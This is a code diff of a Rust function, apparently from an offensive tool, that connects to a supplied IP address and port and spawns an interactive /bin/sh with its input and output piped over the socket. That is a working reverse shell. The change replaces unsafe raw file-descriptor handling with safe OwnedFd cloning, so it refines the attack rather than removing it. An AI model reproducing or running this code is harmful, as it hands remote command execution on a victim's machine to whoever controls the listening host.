@@ -1,5 +1,5 @@
 use std::net::TcpStream;
-use std::os::unix::io::{AsRawFd, FromRawFd};
+use std::os::unix::io::OwnedFd;
 use std::process::{Command, Stdio};
 
 pub fn shell(ip: &str, port: u16) {
@@ -9,14 +9,14 @@ pub fn shell(ip: &str, port: u16) {
     let stream = TcpStream::connect(ip_port).unwrap();
 
     // Use the stream as a file descriptor for sending stdin/stdout/stderr
-    let fd = stream.as_raw_fd();
+    let fd = OwnedFd::from(stream);
 
     // Open shell and set the file descriptor for stdin/stdout/stderr to the stream's file descriptor
     Command::new("/bin/sh")
         .arg("-i")
-        .stdin(unsafe { Stdio::from_raw_fd(fd) })
-        .stdout(unsafe { Stdio::from_raw_fd(fd) })
-        .stderr(unsafe { Stdio::from_raw_fd(fd) })
+        .stdin( Stdio::from(fd.try_clone().unwrap()) )
+        .stdout( Stdio::from(fd.try_clone().unwrap()) )
+        .stderr( Stdio::from(fd) )
         .spawn()
         .unwrap()
         .wait()
